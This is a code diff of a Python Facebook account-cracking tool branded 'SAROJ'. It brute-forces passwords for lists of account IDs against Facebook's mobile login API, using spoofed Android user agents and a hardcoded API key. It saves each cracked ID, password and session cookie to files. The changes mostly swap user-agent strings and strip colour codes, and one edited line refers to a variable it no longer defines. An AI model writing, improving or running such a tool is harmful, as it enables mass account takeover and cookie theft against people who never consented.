@@ -86,12 +86,12 @@ except: pass
 def randBuildLSB():
     vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
     VAPP = random.randint(410000000,499999999)
-    END = '[FBAN/Orca-Android;FBAV/79.0.0.7463;FBBV/718439513;FBDM/{density=2.0,width=720,height=1426};FBLC/en_US;FBRV/261984015;FBCR/Vodafone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.orca;FBDV/Infinix X682C;FBSV/10;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi]'
+    END = '[FBAN/Orca-Android;FBAV/196.0.0.54;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/732868675;FBCR/TIGO;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO CG7;FBSV/8.1.3;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;FBRV/682792302]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
 
 def randBuildvsskj():
-    END = '[FBAN/Orca-Android;FBAV/196.0.0.65;FBPN/com.facebook.orca;FBLC/en_US;FBBV/622665999;FBCR/mt:s;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2067;FBSV/11.2.3;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=1280,height=736};FB_FW/1;FBRV/302016700]'
+    END = '[FBAN/FB4A;FBAV/152.0.0.9.73;FBBV/29687925;FBDM/{density=3.0,width=1080,height=1080};FBLC/en_GB;FBCR/Cellcom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SPH-L720;FBSV/12.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
 #××××××××××(COLOR'S)××××××××××#
@@ -103,34 +103,28 @@ F = '\x1b[38;5;48m'
 Z = '\033[1;33m'
 #××××××××××(LOGO)××××××××××#
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
-	
-
-
-
 logo =                                          """            
 
 
-
-     \033[1;32m
-.d8888.  .d8b.  d8888b.  .d88b.     d88b           \033[1;32m
-88'  YP d8' `8b 88  `8D .8P  Y8.    `8P'         \033[1;32m
-`8bo.   88ooo88 88oobY' 88    88     88          \033[1;32m
-  `Y8b. 88~~~88 88`8b   88    88     88          \033[1;32m
-db   8D 88   88 88 `88. `8b  d8' db. 88          \033[1;32m
-`8888Y' YP   YP 88   YD  `Y88P'  Y8888P          \033[1;32m
+.d8888.  .d8b.  d8888b.  .d88b.     d88b 
+88'  YP d8' `8b 88  `8D .8P  Y8.    `8P' 
+`8bo.   88ooo88 88oobY' 88    88     88  
+  `Y8b. 88~~~88 88`8b   88    88     88  
+db   8D 88   88 88 `88. `8b  d8' db. 88  
+`8888Y' YP   YP 88   YD  `Y88P'  Y8888P  
                                          
-                                  
+                                         
 
    
                                                                       
-\033[1;32m×××××××××××××××××××××××××××××××××××××××××××××××
-\033[1;33m MAKER     >    \033[1;36msaroj
-\033[1;34m GITHUB    >    \033[1;33msaroj
-\033[1;35m TOOL'S    >    \033[1;31mPERSONAL
-\033[1;36m STATU'S   >    \033[1;32mACTIVE
-\033[1;35m×××××××××××××××××××××××××××××××××××××××××××××××    \033[1;35m
+\033[1;37m×××××××××××××××××××××××××××××××××××××××××××××××
+\033[1;37m MAKER     >    \033[1;36msaroj
+\033[1;37m GITHUB    >    \033[1;33msaroj
+\033[1;37m TOOL'S    >    \033[1;31mPERSONAL
+\033[1;37m STATU'S   >    \033[1;32mACTIVE
+\033[1;37m×××××××××××××××××××××××××××××××××××××××××××××××
 \33[37;41m\t VERSION > V1 \33[0;m
-\33[1;33m×××××××××××××××××××××××××××××××××××××××××××××××      \033[1;33m"""
+\33[1;37m××××××××××××××××××××××××××××××××××××××××××××××× """
 #××××××××××(CLEAR)××××××××××#
 def clear():
     os.system("clear")
@@ -150,10 +144,10 @@ def result(OKs,cps):
 def SAROJ():   
     os.system('clear')
     print(logo)
-    print(f'\033[1;33m[1] FILE CRACKING     \033[1;33m ')
-    print(f'\033[1;36m[F] JOIN FACEBOOK GROUP     \033[1;36m ')
+    print(f'[1] FILE CRACKING ')
+    print(f'[F] JOIN FACEBOOK GROUP ')
     print('')
-    select = input('\033[1;39mSELECT MENU :\033[1;39m')
+    select = input('SELECT MENU : ')
     if select =='1':
         method_crack()
     elif select =='F':
@@ -166,13 +160,13 @@ def SAROJ():
 def method_crack():
     global methods
     clear()
-    print(f' \033[1;33m[1] METHOD (1) [BETTER]     \033[1;33m') 
-    print(f' \033[1;34m[2] METHOD (2) [UPDATED]     \033[1;34m')
-    print(f' \033[1;36m[3] METHOD (3) [UPDATED]     \033[1;36m')
+    print(f'[1] METHOD (1) [BETTER]')
+    print(f'[2] METHOD (2) [UPDATED]')
+    print(f'[3] METHOD (3) [UPDATED]')
     #print(f'[4] Method {4}')
-    print(f'\033[1;32m [0] BACK     \033[1;32m')
+    print(f'[0] BACK')
     print('')
-    option = input('\033[1;39mSELECT METHOD :\033[1;39m ')
+    option = input('SELECT METHOD : ')
     if option =='1':
         methods.append('methodA')
         main_crack().crack(id)
@@ -245,7 +239,7 @@ class main_crack():
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/79.0.0.7463;FBBV/718439513;FBDM/{density=2.0,width=720,height=1426};FBLC/en_US;FBRV/261984015;FBCR/Vodafone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.orca;FBDV/Infinix X682C;FBSV/10;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi]',
+                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/196.0.0.54;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/732868675;FBCR/TIGO;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO CG7;FBSV/8.1.3;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;FBRV/682792302]',
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
@@ -264,8 +258,7 @@ class main_crack():
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                     print(f"\r{R} [SAROJ-OK] {sid} | {ps} {S}")
-    
-                    print("\r\r\033[1;36m[COOKIE] : "+ckkk)
+                     
                     oks.append(sid)
                     open('/sdcard/SAROJ_OK_IDs_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SAROJ_IDs_COOKIES_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
@@ -282,7 +275,7 @@ class main_crack():
     def methodC(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r {S}[ saroj ] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[ saroj ] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -313,7 +306,7 @@ class main_crack():
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/196.0.0.87;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/800478008;FBCR/Bezlimit;FBMF/samsung;FBBD/samsung;FBDV/SM-A037U;FBSV/7.2.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1280,height=1920};FB_FW/1;FBRV/232132657]',
+                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/196.0.0.54;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/732868675;FBCR/TIGO;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO CG7;FBSV/8.1.3;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;FBRV/682792302]',
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
@@ -333,7 +326,7 @@ class main_crack():
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                     print(f"\r{R} [saroj-OK] {sid} | {ps} {S}")
                     
-                    print("\r\r\033[1;36m[COOKIE] : "+ckkk)
+                    
                     oks.append(sid)
                     open('/sdcard/saroj_OK_IDs_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/saroj_IDs_COOKIES_M3.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
@@ -381,7 +374,7 @@ class main_crack():
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/196.0.0.59;FBPN/com.facebook.orca;FBLC/en_JP;FBBV/385436451;FBCR/AIS;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2473;FBSV/11.2.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2401};FB_FW/1;FBRV/704298814]',
+                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/196.0.0.54;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/732868675;FBCR/TIGO;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO CG7;FBSV/8.1.3;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;FBRV/682792302]',
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
@@ -398,10 +391,10 @@ class main_crack():
 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SAROJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                     print(f"\r{R} [saroj-OK] {sid} | {ps} {S}")
+                     
                     
-                    print("\r\r\033[1;36m[COOKIE] : "+ckkk)
                     oks.append(sid)
                     open('/sdcard/saroj_OK_IDs_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/saroj_IDs_COOKIES_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
@@ -442,7 +435,7 @@ class main_crack():
                 if 'c_user' in session.cookies.get_dict():
                     print(f"\r{R} [SAROJ-OK] {sid} | {ps} {S}")
                     
-                    print("\r\r\033[1;36m[COOKIE] : "+ckkk)
+                    
                     oks.append(sid)
                     open('/sdcard/SAROJ_OK.txt','a').write(sid+'|'+ps+'\n')
                     break
@@ -462,8 +455,8 @@ class main_crack():
     def pasw(self):       
             pw = []
             clear()
-            print('\033[96;1mPUT LIMIT BETWEEN 1 TO 30\033[96;1m')
-            sl = int(input('\033[95;1mHOW MANY PASSWORD DO YOU WANT TO ADD ? :\033[95;1m '))
+            print('PUT LIMIT BETWEEN 1 TO 30')
+            sl = int(input('HOW MANY PASSWORD DO YOU WANT TO ADD ? : '))
             os.system("clear")
             print(logo)
             print(f'{S} (Example : first123,last1122,firstlast,last,etc)')
@@ -503,5 +496,4 @@ class main_crack():
                    except:pass
             result(oks,cps)
 
-			
 SAROJ()
